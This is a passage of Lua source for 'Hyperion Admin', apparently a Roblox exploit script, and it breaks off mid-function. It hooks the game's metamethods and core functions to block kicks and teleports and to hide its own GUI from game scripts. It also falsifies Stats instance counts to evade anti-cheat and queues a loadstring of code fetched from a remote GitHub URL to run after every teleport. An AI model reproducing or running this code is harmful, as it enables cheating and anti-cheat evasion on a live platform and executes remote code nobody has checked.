--[[
	Hyperion Admin -17/05/2023-
]]

local game = game
local GetService = game.GetService
if (not game.IsLoaded(game)) then
	local Loaded = game.Loaded
	Loaded.Wait(Loaded);
end

local _L = {}

_L.start = start or tick();
local Debug = true

do
	local F_A = getgenv().F_A
	if (F_A) then
		local Notify, GetConfig = F_A.Utils.Notify, F_A.GetConfig
		local UserInputService = GetService(game, "UserInputService");
		local CommandBarPrefix = GetConfig().CommandBarPrefix
		local StringKeyCode = UserInputService.GetStringForKeyCode(UserInputService, Enum.KeyCode[CommandBarPrefix]);
		return Notify(nil, "Loaded", "Hyperion admin is already loaded.", nil),
		Notify(nil, "Your Prefix is", string.format("%s (%s)", StringKeyCode, CommandBarPrefix));
	end
end

--IMPORT [var]
local Services = {
	Workspace = GetService(game, "Workspace");
	UserInputService = GetService(game, "UserInputService");
	ReplicatedStorage = GetService(game, "ReplicatedStorage");
	StarterPlayer = GetService(game, "StarterPlayer");
	StarterPack = GetService(game, "StarterPack");
	StarterGui = GetService(game, "StarterGui");
	TeleportService = GetService(game, "TeleportService");
	CoreGui = GetService(game, "CoreGui");
	TweenService = GetService(game, "TweenService");
	HttpService = GetService(game, "HttpService");
	TextService = GetService(game, "TextService");
	MarketplaceService = GetService(game, "MarketplaceService");
	Chat = GetService(game, "Chat");
	Teams = GetService(game, "Teams");
	SoundService = GetService(game, "SoundService");
	Lighting = GetService(game, "Lighting");
	ScriptContext = GetService(game, "ScriptContext");
	Stats = GetService(game, "Stats");
}

setmetatable(Services, {
	__index = function(Table, Property)
		local Ret, Service = pcall(GetService, game, Property);
		if (Ret) then
			Services[Property] = Service
			return Service
		end
		return nil
	end,
	__mode = "v"
});

local QueueTeleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
local GetChildren, GetDescendants = game.GetChildren, game.GetDescendants
local IsA = game.IsA
local FindFirstChild, FindFirstChildOfClass, FindFirstChildWhichIsA, WaitForChild = 
	game.FindFirstChild,
game.FindFirstChildOfClass,
game.FindFirstChildWhichIsA,
game.WaitForChild

local GetPropertyChangedSignal, Changed = 
	game.GetPropertyChangedSignal,
game.Changed

local Destroy, Clone = game.Destroy, game.Clone

local Heartbeat, Stepped, RenderStepped;
do
	local RunService = Services.RunService;
	Heartbeat, Stepped, RenderStepped =
		RunService.Heartbeat,
	RunService.Stepped,
	RunService.RenderStepped
end

local Players = Services.Players
local GetPlayers = Players.GetPlayers

if QueueTeleport then
	QueueTeleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/LighTMolT/wdawdv/main/Test'))()")
end

local function getplr(name)
	for i,v in pairs(game.Players:GetPlayers()) do
		if v.Name:lower():find(name:lower()) or v.DisplayName:lower():find(name:lower()) then return v end
	end
end

local JSONEncode, JSONDecode, GenerateGUID = 
	Services.HttpService.JSONEncode, 
Services.HttpService.JSONDecode,
Services.HttpService.GenerateGUID

local Camera = Services.Workspace.CurrentCamera

local Tfind, sort, concat, pack, unpack;
do
	local table = table
	Tfind, sort, concat, pack, unpack = 
		table.find, 
	table.sort,
	table.concat,
	table.pack,
	table.unpack
end

local lower, upper, Sfind, split, sub, format, len, match, gmatch, gsub, byte;
do
	local string = string
	lower, upper, Sfind, split, sub, format, len, match, gmatch, gsub, byte = 
		string.lower,
	string.upper,
	string.find,
	string.split, 
	string.sub,
	string.format,
	string.len,
	string.match,
	string.gmatch,
	string.gsub,
	string.byte
end

local random, floor, round, abs, atan, cos, sin, rad;
do
	local math = math
	random, floor, round, abs, atan, cos, sin, rad = 
		math.random,
	math.floor,
	math.round,
	math.abs,
	math.atan,
	math.cos,
	math.sin,
	math.rad
end

local InstanceNew = Instance.new
local CFrameNew = CFrame.new
local Vector3New = Vector3.new

local Inverse, toObjectSpace, components
do
	local CalledCFrameNew = CFrameNew();
	Inverse = CalledCFrameNew.Inverse
	toObjectSpace = CalledCFrameNew.toObjectSpace
	components = CalledCFrameNew.components
end

local Connection = game.Loaded
local CWait = Connection.Wait
local CConnect = Connection.Connect

local Disconnect;
do
	local CalledConnection = CConnect(Connection, function() end);
	Disconnect = CalledConnection.Disconnect
end

local __H = InstanceNew("Humanoid");
local UnequipTools = __H.UnequipTools
local ChangeState = __H.ChangeState
local SetStateEnabled = __H.SetStateEnabled
local GetState = __H.GetState
local GetAccessories = __H.GetAccessories

local LocalPlayer = Players.LocalPlayer
local PlayerGui =  FindFirstChildWhichIsA(LocalPlayer, "PlayerGui");
local Mouse = LocalPlayer.GetMouse(LocalPlayer);

local CThread;
do
	local wrap = coroutine.wrap
	CThread = function(Func, ...)
		if (type(Func) ~= 'function') then
			return nil
		end
		local Varag = ...
		return function()
			local Success, Ret = pcall(wrap(Func, Varag));
			if (Success) then
				return Ret
			end
			if (Debug) then
				warn("[FA Error]: " .. debug.traceback(Ret));
			end
		end
	end
end

local startsWith = function(str, searchString, rawPos)
	local pos = rawPos or 1
	return searchString == "" and true or sub(str, pos, pos) == searchString
end

local trim = function(str)
	return gsub(str, "^%s*(.-)%s*$", "%1");
end

local tbl_concat = function(...)
	local new = {}
	for i, v in next, {...} do
		for i2, v2 in next, v do
			new[i] = v2
		end
	end
	return new
end

local indexOf = function(tbl, val)
	if (type(tbl) == 'table') then
		for i, v in next, tbl do
			if (v == val) then
				return i
			end
		end
	end
end

local forEach = function(tbl, ret)
	for i, v in next, tbl do
		ret(i, v);
	end
end

local filter = function(tbl, ret)
	if (type(tbl) == 'table') then
		local new = {}
		for i, v in next, tbl do
			if (ret(i, v)) then
				new[#new + 1] = v
			end
		end
		return new
	end
end

local map = function(tbl, ret)
	if (type(tbl) == 'table') then
		local new = {}
		for i, v in next, tbl do
			local Value, Key = ret(i, v);
			new[Key or #new + 1] = Value
		end
		return new
	end
end

local deepsearch;
deepsearch = function(tbl, ret)
	if (type(tbl) == 'table') then
		for i, v in next, tbl do
			if (type(v) == 'table') then
				deepsearch(v, ret);
			end
			ret(i, v);
		end
	end
end

local deepsearchset;
deepsearchset = function(tbl, ret, value)
	if (type(tbl) == 'table') then
		local new = {}
		for i, v in next, tbl do
			new[i] = v
			if (type(v) == 'table') then
				new[i] = deepsearchset(v, ret, value);
			end
			if (ret(i, v)) then
				new[i] = value(i, v);
			end
		end
		return new
	end
end

local flat = function(tbl)
	if (type(tbl) == 'table') then
		local new = {}
		deepsearch(tbl, function(i, v)
			if (type(v) ~= 'table') then
				new[#new + 1] = v
			end
		end)
		return new
	end
end

local flatMap = function(tbl, ret)
	if (type(tbl) == 'table') then
		local new = flat(map(tbl, ret));
		return new
	end
end

local shift = function(tbl)
	if (type(tbl) == 'table') then
		local firstVal = tbl[1]
		tbl = pack(unpack(tbl, 2, #tbl));
		tbl.n = nil
		return tbl
	end
end

local keys = function(tbl)
	if (type(tbl) == 'table') then
		local new = {}
		for i, v in next, tbl do
			new[#new + 1] = i	
		end
		return new
	end
end

local function clone(toClone, shallow)
	if (type(toClone) == 'function' and clonefunction) then
		return clonefunction(toClone);
	end
	local new = {}
	for i, v in pairs(toClone) do
		if (type(v) == 'table' and not shallow) then
			v = clone(v);
		end
		new[i] = v
	end
	return new
end

local setthreadidentity = setthreadidentity or syn_context_set or setthreadcontext or (syn and syn.set_thread_identity)
local getthreadidentity = getthreadidentity or syn_context_get or getthreadcontext or (syn and syn.get_thread_identity)

--END IMPORT [var]



local GetCharacter = GetCharacter or function(Plr)
	return Plr and Plr.Character or LocalPlayer.Character
end

local Utils = {}

--IMPORT [extend]
local Stats = Services.Stats
local ContentProvider = Services.ContentProvider

local firetouchinterest, hookfunction;
do
	local GEnv = getgenv();
	local touched = {}
	firetouchinterest = GEnv.firetouchinterest or function(part1, part2, toggle)
		if (part1 and part2) then
			if (toggle == 0) then
				touched[1] = part1.CFrame
				part1.CFrame = part2.CFrame
			else
				part1.CFrame = touched[1]
				touched[1] = nil
			end
		end
	end
	local newcclosure = newcclosure or function(f)
		return f
	end

	hookfunction = GEnv.hookfunction or function(func, newfunc, applycclosure)
		if (replaceclosure) then
			replaceclosure(func, newfunc);
			return func
		end
		func = applycclosure and newcclosure or newfunc
		return func
	end
end

if (not syn_context_set) then
	local CachedConnections = setmetatable({}, {
		__mode = "v"
	});

	GEnv = getgenv();
	getconnections = function(Connection, FromCache, AddOnConnect)
		local getconnections = GEnv.getconnections
		if (not getconnections) then
			return {}
		end

		local CachedConnection;
		for i, v in next, CachedConnections do
			if (i == Connection) then
				CachedConnection = v
				break;
			end
		end
		if (CachedConnection and FromCache) then
			return CachedConnection
		end

		local Connections = GEnv.getconnections(Connection);
		CachedConnections[Connection] = Connections
		return Connections
	end
end

local getrawmetatable = getrawmetatable or function()
	return setmetatable({}, {});
end

local getnamecallmethod = getnamecallmethod or function()
	return ""
end

local checkcaller = checkcaller or function()
	return false
end

local Hooks = {
	AntiKick = false,
	AntiTeleport = false,
	NoJumpCooldown = false,
}

local mt = getrawmetatable(game);
local OldMetaMethods = {}
setreadonly(mt, false);
for i, v in next, mt do
	OldMetaMethods[i] = v
end
setreadonly(mt, true);
local MetaMethodHooks = {}

local ProtectInstance, SpoofInstance, SpoofProperty;
local pInstanceCount = {0, 0}; -- instancecount, primitivescount
local ProtectedInstances = setmetatable({}, {
	__mode = "v"
});
local FocusedTextBox = nil
do
	local SpoofedInstances = setmetatable({}, {
		__mode = "v"
	});
	local SpoofedProperties = {}
	Hooks.SpoofedProperties = SpoofedProperties

	local otherCheck = function(instance, n)
		if (IsA(instance, "ImageLabel") or IsA(instance, "ImageButton")) then
			ProtectedInstances[#ProtectedInstances + 1] = instance
			return;
		end

		if (IsA(instance, "BasePart")) then
			pInstanceCount[2] = math.max(pInstanceCount[2] + (n or 1), 0);
		end
	end

	ProtectInstance = function(Instance_)
		if (not Tfind(ProtectedInstances, Instance_)) then
			ProtectedInstances[#ProtectedInstances + 1] = Instance_
			local descendants = Instance_:GetDescendants();
			pInstanceCount[1] += 1 + #descendants;
			for i = 1, #descendants do
				otherCheck(descendants[i]);
			end
			local dAdded = Instance_.DescendantAdded:Connect(function(descendant)
				pInstanceCount[1] += 1
				otherCheck(descendant);
			end);
			local dRemoving = Instance_.DescendantRemoving:Connect(function(descendant)
				pInstanceCount[1] = math.max(pInstanceCount[1] - 1, 0);
				otherCheck(descendant, -1);
			end);
			otherCheck(Instance_);

			Instance_.Name = sub(gsub(GenerateGUID(Services.HttpService, false), '-', ''), 1, random(25, 30));
			Instance_.Archivable = false
		end
	end

	SpoofInstance = function(Instance_, Instance2)
		if (not SpoofedInstances[Instance_]) then
			SpoofedInstances[Instance_] = Instance2 and Instance2 or Clone(Instance_);
		end
	end

	UnSpoofInstance = function(Instance_)
		if (SpoofedInstances[Instance_]) then
			SpoofedInstances[Instance_] = nil
		end
	end

	local ChangedSpoofedProperties = {}
	SpoofProperty = function(Instance_, Property, NoClone)
		if (SpoofedProperties[Instance_]) then
			local SpoofedPropertiesForInstance = SpoofedProperties[Instance_]
			local Properties = map(SpoofedPropertiesForInstance, function(i, v)
				return v.Property
			end)
			if (not Tfind(Properties, Property)) then
				SpoofedProperties[Instance_][#SpoofedPropertiesForInstance + 1] = {
					SpoofedProperty = SpoofedPropertiesForInstance[1].SpoofedProperty,
					Property = Property,
				};
			end
		else
			local Cloned;
			if (not NoClone and IsA(Instance_, "Instance") and not Services[tostring(Instance_)] and Instance_.Archivable) then
				local Success, Ret = pcall(Clone, Instance_);
				if (Success) then
					Cloned = Ret
				end
			end
			SpoofedProperties[Instance_] = {{
				SpoofedProperty = Cloned and Cloned or {[Property]=Instance_[Property]},
				Property = Property,
			}}
			ChangedSpoofedProperties[Instance_] = {}
		end
	end

	local GetAllParents = function(Instance_, NIV)
		if (typeof(Instance_) == "Instance") then
			local Parents = {}
			local Current = NIV or Instance_
			if (NIV) then
				Parents[#Parents + 1] = Current
			end
			repeat
				local Parent = Current.Parent
				Parents[#Parents + 1] = Parent
				Current = Parent
			until not Current
			return Parents
		end
		return {}
	end

	local Methods = {
		"FindFirstChild",
		"FindFirstChildWhichIsA",
		"FindFirstChildOfClass",
		"IsA"
	}

	local lockedInstances = {};
	setmetatable(lockedInstances, { __mode = "k" });
	local isProtected = function(instance)
		if (lockedInstances[instance]) then
			return true;
		end

		local good2 = pcall(tostring, instance);
		if (not good2) then
			lockedInstances[instance] = true
			return true;
		end

		for i2 = 1, #ProtectedInstances do
			local pInstance = ProtectedInstances[i2]
			if (pInstance == instance) then
				return true;
			end
		end
		return false;
	end

	MetaMethodHooks.Namecall = function(...)
		local __Namecall = OldMetaMethods.__namecall;
		local Args = {...}
		local self = Args[1]
		local Method = getnamecallmethod() or "";

		if (Method ~= "") then
			local Success, result = pcall(OldMetaMethods.__index, self, Method);
			if (not Success or Success and type(result) ~= "function") then
				return __Namecall(...);
			end
		end

		if (Hooks.AntiKick and lower(Method) == "kick") then
			local Player, Message = self, Args[2]
			if (Hooks.AntiKick and Player == LocalPlayer) then
				local Notify = Utils.Notify
				local Context;
				if (setthreadidentity) then
					Context = getthreadidentity();
					setthreadidentity(3);
				end
				if (Notify and Context) then
					Notify(nil, "Attempt to kick", format("attempt to kick %s", (Message and type(Message) == 'number' or type(Message) == 'string') and ": " .. Message or ""));
					setthreadidentity(Context);
				end
				return
			end
		end

		if (Hooks.AntiTeleport and Method == "Teleport" or Method == "TeleportToPlaceInstance") then
			local Player, PlaceId = self, Args[2]
			if (Hooks.AntiTeleport and Player == LocalPlayer) then
				local Notify = Utils.Notify
				local Context;
				if (setthreadidentity) then
					Context = getthreadidentity();
					setthreadidentity(3);
				end
				if (Notify and Context) then
					Notify(nil, "Attempt to teleport", format("attempt to teleport to place %s", PlaceId and PlaceId or ""));
					setthreadidentity(Context);
				end
				return
			end
		end

		if (checkcaller()) then
			return __Namecall(...);
		end

		if (Tfind(Methods, Method)) then
			local ReturnedInstance = __Namecall(...);
			if (Tfind(ProtectedInstances, ReturnedInstance)) then
				return Method == "IsA" and false or nil
			end
		end

		-- ik this is horrible but fates admin v3 has a better way of doing hooks
		if (Method == "children" or Method == "GetChildren" or Method ==  "getChildren" or Method == "GetDescendants" or Method == "getDescendants") then
			return filter(__Namecall(...), function(i, instance)
				return not isProtected(instance);
			end);
		end

		if (self == Services.UserInputService and (Method == "GetFocusedTextBox" or Method == "getFocusedTextBox")) then
			local focused = __Namecall(...);
			if (focused) then
				for i = 1, #ProtectedInstances do
					local ProtectedInstance = ProtectedInstances[i]
					local iden = getthreadidentity();
					setthreadidentity(7);
					local pInstance = Tfind(ProtectedInstances, focused) or focused.IsDescendantOf(focused, ProtectedInstance);
					setthreadidentity(iden);
					if (pInstance) then
						return nil;
					end
				end
			end
			return focused;
		end

		if (Hooks.NoJumpCooldown and (Method == "GetState" or Method == "GetStateEnabled")) then
			local State = __Namecall(...);
			if (Method == "GetState" and (State == Enum.HumanoidStateType.Jumping or State == "Jumping")) then
				return Enum.HumanoidStateType.RunningNoPhysics
			end
			if (Method == "GetStateEnabled" and (self == Enum.HumanoidStateType.Jumping or self == "Jumping")) then
				return false
			end
		end

		return __Namecall(...);
	end

	local AllowedIndexes = {
		"RootPart",
		"Parent"
	}
	local AllowedNewIndexes = {
		"Jump"
	}
	MetaMethodHooks.Index = function(...)
		local __Index = OldMetaMethods.__index;
		local called = __Index(...);

		if (checkcaller()) then
			return __Index(...);
		end
		local Instance_, Index = ...

		local SanitisedIndex = Index
		if (typeof(Instance_) == 'Instance' and type(Index) == 'string') then
			SanitisedIndex = gsub(sub(Index, 0, 100), "%z.*", "");
		end
		local SpoofedInstance = SpoofedInstances[Instance_]
		local SpoofedPropertiesForInstance = SpoofedProperties[Instance_]

		if (SpoofedInstance) then
			if (Tfind(AllowedIndexes, SanitisedIndex)) then
				return __Index(Instance_, Index);
			end
			return __Index(SpoofedInstance, Index);
		end

		if (SpoofedPropertiesForInstance) then
			for i, SpoofedProperty in next, SpoofedPropertiesForInstance do
				local SanitisedIndex = gsub(SanitisedIndex, "^%l", upper);
				if (SanitisedIndex == SpoofedProperty.Property) then
					local ClientChangedData = ChangedSpoofedProperties[Instance_][SanitisedIndex]
					local IndexedSpoofed = __Index(SpoofedProperty.SpoofedProperty, Index);
					local Indexed = __Index(Instance_, Index);
					if (ClientChangedData.Caller and ClientChangedData.Value ~= Indexed) then
						OldMetaMethods.__newindex(SpoofedProperty.SpoofedProperty, Index, Indexed);
						OldMetaMethods.__newindex(Instance_, Index, ClientChangedData.Value);
						return Indexed
					end
					return IndexedSpoofed
				end
			end
		end

		if (Hooks.NoJumpCooldown and SanitisedIndex == "Jump") then
			if (IsA(Instance_, "Humanoid")) then
				return false
			end
		end

		if (Instance_ == Stats and (SanitisedIndex == "InstanceCount" or SanitisedIndex == "instanceCount")) then
			return called - pInstanceCount[1];
		end

		if (Instance_ == Stats and (SanitisedIndex == "PrimitivesCount" or SanitisedIndex == "primitivesCount")) then
			return called - pInstanceCount[2];
		end

		return called;
	end

	MetaMethodHooks.NewIndex = function(...)
		local __NewIndex = OldMetaMethods.__newindex;
		local __Index = OldMetaMethods.__index;
		local Instance_, Index, Value = ...

		local SpoofedInstance = SpoofedInstances[Instance_]
		local SpoofedPropertiesForInstance = SpoofedProperties[Instance_]

		if (checkcaller()) then
			if (Index == "Parent" and Value) then
				local ProtectedInstance
				for i = 1, #ProtectedInstances do
					local ProtectedInstance_ = ProtectedInstances[i]
					if (Instance_ == ProtectedInstance_ or Instance_.IsDescendantOf(Value, ProtectedInstance_)) then
						ProtectedInstance = true
					end
				end
				if (ProtectedInstance) then
					local Parents = GetAllParents(Instance_, Value);
					local child1 = getconnections(Parents[1].ChildAdded, true);
					local descendantconnections = {}
					for i, v in next, child1 do
						v.Disable(v);
					end
					for i = 1, #Parents do
						local Parent = Parents[i]
						for i2, v in next, getconnections(Parent.DescendantAdded, true) do
							v.Disable(v);
							descendantconnections[#descendantconnections + 1] = v
						end
					end
					local good, Ret = pcall(__NewIndex, ...);
					for i, v in pairs(descendantconnections) do
						v:Enable();
					end
					for i, v in next, child1 do
						v.Enable(v);
					end
					if (not good) then
						return __NewIndex(...);
					end
					return Ret;
				end
			end
			if (SpoofedInstance or SpoofedPropertiesForInstance) then
				if (SpoofedPropertiesForInstance) then
					ChangedSpoofedProperties[Instance_][Index] = {
						Caller = true,
						BeforeValue = Instance_[Index],
						Value = Value
					}
				end
				local Connections = tbl_concat(
					-- getconnections(GetPropertyChangedSignal(Instance_, SpoofedPropertiesForInstance and SpoofedPropertiesForInstance.Property or Index), true),
					-- getconnections(Instance_.Changed, true),
					getconnections(game.ItemChanged, true)
				)

				if (not next(Connections)) then
					return __NewIndex(Instance_, Index, Value);
				end
				for i, v in next, Connections do
					v.Disable(v);
				end
				local Ret = __NewIndex(Instance_, Index, Value);
				for i, v in next, Connections do
					v.Enable(v);
				end
				return Ret
			end
			return __NewIndex(...);
		end

		local SanitisedIndex = Index
		if (typeof(Instance_) == 'Instance' and type(Index) == 'string') then
			local len = select(2, gsub(Index, "%z", ""));
			if (len > 255) then
				return __Index(...);
			end

			SanitisedIndex = gsub(sub(Index, 0, 100), "%z.*", "");
		end

		if (SpoofedInstance) then
			if (Tfind(AllowedNewIndexes, SanitisedIndex)) then
				return __NewIndex(...);
			end
			return __NewIndex(SpoofedInstance, Index, __Index(SpoofedInstance, Index));
		end

		if (SpoofedPropertiesForInstance) then
			for i, SpoofedProperty in next, SpoofedPropertiesForInstance do
				if (SpoofedProperty.Property == SanitisedIndex and not Tfind(AllowedIndexes, SanitisedIndex)) then
					ChangedSpoofedProperties[Instance_][SanitisedIndex] = {
						Caller = false,
						BeforeValue = Instance_[Index],
						Value = Value
					}
					return __NewIndex(SpoofedProperty.SpoofedProperty, Index, Value);
				end
			end
		end

		return __NewIndex(...);
	end

	local hookmetamethod = hookmetamethod or function(metatable, metamethod, func)
		setreadonly(metatable, false);
		Old = hookfunction(metatable[metamethod], func, true);
		setreadonly(metatable, true);
		return Old
	end

	OldMetaMethods.__index = hookmetamethod(game, "__index", MetaMethodHooks.Index);
	OldMetaMethods.__newindex = hookmetamethod(game, "__newindex", MetaMethodHooks.NewIndex);
	OldMetaMethods.__namecall = hookmetamethod(game, "__namecall", MetaMethodHooks.Namecall);

	Hooks.Destroy = hookfunction(game.Destroy, function(...)
		local instance = ...
		local protected = table.find(ProtectedInstances, instance);
		if (checkcaller() and protected) then
			otherCheck(instance, -1);
			local Parents = GetAllParents(instance);
			for i, v in next, getconnections(Parents[1].ChildRemoved, true) do
				v.Disable(v);
			end
			for i = 1, #Parents do
				local Parent = Parents[i]
				for i2, v in next, getconnections(Parent.DescendantRemoving, true) do
					v.Disable(v);
				end
			end
			local destroy = Hooks.Destroy(...);
			for i = 1, #Parents do
				local Parent = Parents[i]
				for i2, v in next, getconnections(Parent.DescendantRemoving, true) do
					v.Enable(v);
				end
			end
			for i, v in next, getconnections(Parents[1].ChildRemoved, true) do
				v.Enable(v);
			end
			table.remove(ProtectedInstances, protected);
			return destroy;
		end
		return Hooks.Destroy(...);
	end);
end

Hooks.OldGetChildren = hookfunction(game.GetChildren, newcclosure(function(...)
	if (not checkcaller()) then
		local Children = Hooks.OldGetChildren(...);
		return filter(Children, function(i, v)
			return not Tfind(ProtectedInstances, v);
		end)
	end
	return Hooks.OldGetChildren(...);
end));

Hooks.OldGetDescendants = hookfunction(game.GetDescendants, newcclosure(function(...)
	if (not checkcaller()) then
		local Descendants = Hooks.OldGetDescendants(...);
		return filter(Descendants, function(i, v)
			local Protected = false
			for i2 = 1, #ProtectedInstances do
				local ProtectedInstance = ProtectedInstances[i2]
				Protected = v and ProtectedInstance == v or v.IsDescendantOf(v, ProtectedInstance)
				if (Protected) then
					break;
				end
			end
			return not Protected
		end)
	end
	return Hooks.OldGetDescendants(...);
end));

Hooks.FindFirstChild = hookfunction(game.FindFirstChild, newcclosure(function(...)
	if (not checkcaller()) then
		local ReturnedInstance = Hooks.FindFirstChild(...);
		if (ReturnedInstance and Tfind(ProtectedInstances, ReturnedInstance)) then
			return nil
		end
	end
	return Hooks.FindFirstChild(...);
end));
Hooks.FindFirstChildOfClass = hookfunction(game.FindFirstChildOfClass, newcclosure(function(...)
	if (not checkcaller()) then
		local ReturnedInstance = Hooks.FindFirstChildOfClass(...);
		if (ReturnedInstance and Tfind(ProtectedInstances, ReturnedInstance)) then
			return nil
		end
	end
	return Hooks.FindFirstChildOfClass(...);
end));
Hooks.FindFirstChildWhichIsA = hookfunction(game.FindFirstChildWhichIsA, newcclosure(function(...)
	if (not checkcaller()) then
		local ReturnedInstance = Hooks.FindFirstChildWhichIsA(...);
		if (ReturnedInstance and Tfind(ProtectedInstances, ReturnedInstance)) then
			return nil
		end
	end
	return Hooks.FindFirstChildWhichIsA(...);
end));
Hooks.IsA = hookfunction(game.IsA, newcclosure(function(...)
	if (not checkcaller()) then
		local Args = {...}
		local IsACheck = Args[1]
		if (IsACheck) then
			local ProtectedInstance = Tfind(ProtectedInstances, IsACheck);
			if (ProtectedInstance and Args[2]) then
				return false
			end
		end
	end
	return Hooks.IsA(...);
end));

Hooks.OldGetFocusedTextBox = hookfunction(Services.UserInputService.GetFocusedTextBox, newcclosure(function(...)
	if (not checkcaller() and ... == Services.UserInputService) then
		local FocusedTextBox = Hooks.OldGetFocusedTextBox(...);
		if(FocusedTextBox) then
			local Protected = false
			for i = 1, #ProtectedInstances do
				local ProtectedInstance = ProtectedInstances[i]
				Protected = Tfind(ProtectedInstances, FocusedTextBox) or FocusedTextBox.IsDescendantOf(FocusedTextBox, ProtectedInstance);
			end
			if (Protected) then
				return nil
			end
		end
		return FocusedTextBox;
	end
	return Hooks.OldGetFocusedTextBox(...);
end));

Hooks.OldKick = hookfunction(LocalPlayer.Kick, newcclosure(function(...)
	local Player, Message = ...
	if (Hooks.AntiKick and Player == LocalPlayer) then
		local Notify = Utils.Notify
		local Context;
		if (setthreadidentity) then
			Context = getthreadidentity();
			setthreadidentity(3);
		end
		if (Notify and Context) then
			Notify(nil, "Attempt to kick", format("attempt to kick %s", (Message and type(Message) == 'number' or type(Message) == 'string') and ": " .. Message or ""));
			setthreadidentity(Context)
		end
		return
	end
	return Hooks.OldKick(...);
end))

Hooks.OldTeleportToPlaceInstance = hookfunction(Services.TeleportService.TeleportToPlaceInstance, newcclosure(function(...)
	local Player, PlaceId = ...
	if (Hooks.AntiTeleport and Player == LocalPlayer) then
		local Notify = Utils.Notify
		local Context;
		if (setthreadidentity) then
			Context = getthreadidentity();
			setthreadidentity(3);
		end
		if (Notify and Context) then
			Notify(nil, "Attempt to teleport", format("attempt to teleport to place %s", PlaceId and PlaceId or ""));
			setthreadidentity(Context)
		end
		return
	end
	return Hooks.OldTeleportToPlaceInstance(...);
end))
Hooks.OldTeleport = hookfunction(Services.TeleportService.Teleport, newcclosure(function(...)
	local Player, PlaceId = ...
	if (Hooks.AntiTeleport and Player == LocalPlayer) then
		local Notify = Utils.Notify
		local Context;
		if (setthreadidentity) then
			Context = getthreadidentity();
			setthreadidentity(3);
		end
		if (Notify and Context) then
			Notify(nil, "Attempt to teleport", format("attempt to teleport to place \"%s\"", PlaceId and PlaceId or ""));
			setthreadidentity(Context);
		end
		return
	end
	return Hooks.OldTeleport(...);
end))

Hooks.GetState = hookfunction(GetState, function(...)
	local Humanoid, State = ..., Hooks.GetState(...);
	local Parent, Character = Humanoid.Parent, LocalPlayer.Character
	if (Hooks.NoJumpCooldown and (State == Enum.HumanoidStateType.Jumping or State == "Jumping") and Parent and Character and Parent == Character) then
		return Enum.HumanoidStateType.RunningNoPhysics
	end
	return State
end)

Hooks.GetStateEnabled = hookfunction(__H.GetStateEnabled, function(...)
	local Humanoid, State = ...
	local Ret = Hooks.GetStateEnabled(...);
	local Parent, Character = Humanoid.Parent, LocalPlayer.Character
	if (Hooks.NoJumpCooldown and (State == Enum.HumanoidStateType.Jumping or State == "Jumping") and Parent and Character and Parent == Character) then
		return false
	end
	return Ret
end)
--END IMPORT [extend]



local GetRoot = function(Plr, Char)
	local LCharacter = GetCharacter();
	local Character = Char or GetCharacter(Plr);
	return Plr and Character and (FindFirstChild(Character, "HumanoidRootPart") or FindFirstChild(Character, "Torso") or FindFirstChild(Character, "UpperTorso")) or LCharacter and (FindFirstChild(LCharacter, "HumanoidRootPart") or FindFirstChild(LCharacter, "Torso") or FindFirstChild(LCharacter, "UpperTorso"));
end

local GetHumanoid = function(Plr, Char)
	local LCharacter = GetCharacter();
	local Character = Char or GetCharacter(Plr);
	return Plr and Character and FindFirstChildWhichIsA(Character, "Humanoid") or LCharacter and FindFirstChildWhichIsA(LCharacter, "Humanoid");
end

local GetMagnitude = function(Plr, Char)
	local LRoot = GetRoot();
	local Root = GetRoot(Plr, Char);
	return Plr and Root and (Root.Position - LRoot.Position).magnitude or math.huge
end

local Settings = {
	Prefix = ">",
	CommandBarPrefix = "Semicolon",
	ChatPrediction = false,
	Macros = {},
	Aliases = {},
}
local PluginSettings = {
	PluginsEnabled = true,
	PluginDebug = false,
	DisabledPlugins = {
		["PluginName"] = true
	},
	SafePlugins = false
}

local WriteConfig = function(Destroy)
	local JSON = JSONEncode(Services.HttpService, Settings);
	local PluginJSON = JSONEncode(Services.HttpService, PluginSettings);
	if (isfolder("Hyperion-admin") and Destroy) then
		delfolder("Hyperion-admin");
		writefile("Hyperion-admin/config.json", JSON);
		writefile("fates/admin/pluings/plugin-conf.json", PluginJSON);
	else
		makefolder("Hyperion-admin");
		makefolder("Hyperion-admin/plugins");
		makefolder("Hyperion-admin/chatlogs");
		writefile("Hyperion-admin/config.json", JSON);
		writefile("Hyperion-admin/plugins/plugin-conf.json", PluginJSON);
	end
end

local GetConfig = function()
	if (isfolder("Hyperion-admin") and isfile("Hyperion-admin/config.json")) then
		return JSONDecode(Services.HttpService, readfile("Hyperion-admin/config.json"));
	else
		WriteConfig();
		return JSONDecode(Services.HttpService, readfile("Hyperion-admin/config.json"));
	end
end

local GetPluginConfig = function()
	if (isfolder("Hyperion-admin") and isfolder("Hyperion-admin/plugins") and isfile("Hyperion-admin/plugins/plugin-conf.json")) then
		local JSON = JSONDecode(Services.HttpService, readfile("Hyperion-admin/plugins/plugin-conf.json"));
		return JSON
	else
		WriteConfig();
		return JSONDecode(Services.HttpService, readfile("Hyperion-admin/plugins/plugin-conf.json"));
	end
end

local SetPluginConfig = function(conf)
	if (isfolder("Hyperion-admin") and isfolder("Hyperion-admin/plugins") and isfile("Hyperion-admin/plugins/plugin-conf.json")) then
		WriteConfig();
	end
	local NewConfig = GetPluginConfig();
	for i, v in next, conf do
		NewConfig[i] = v
	end
	writefile("Hyperion-admin/plugins/plugin-conf.json", JSONEncode(Services.HttpService, NewConfig));
end

local SetConfig = function(conf)
	if (not isfolder("Hyperion-admin") and isfile("Hyperion-admin/config.json")) then
		WriteConfig();
	end
	local NewConfig = GetConfig();
	for i, v in next, conf do
		NewConfig[i] = v
	end
	writefile("Hyperion-admin/config.json", JSONEncode(Services.HttpService, NewConfig));
end

local CurrentConfig = GetConfig();
local Prefix = isfolder and CurrentConfig.Prefix or ">"
local Macros = CurrentConfig.Macros or {}
local AdminUsers = AdminUsers or {}
local Exceptions = Exceptions or {}
local Connections = {
	Players = {}
}
_L.CLI = false
_L.ChatLogsEnabled = true
_L.GlobalChatLogsEnabled = false
_L.HttpLogsEnabled = true

local GetPlayer;
GetPlayer = function(str, noerror)
	local CurrentPlayers = filter(GetPlayers(Players), function(i, v)
		return not Tfind(Exceptions, v);
	end)
	if (not str) then
		return {}
	end
	str = lower(trim(str));
	if (Sfind(str, ",")) then
		return flatMap(split(str, ","), function(i, v)
			return GetPlayer(v, noerror);
		end)
	end

	local Magnitudes = map(CurrentPlayers, function(i, v)
		return {v,(GetRoot(v).CFrame.p - GetRoot().CFrame.p).Magnitude}
	end)

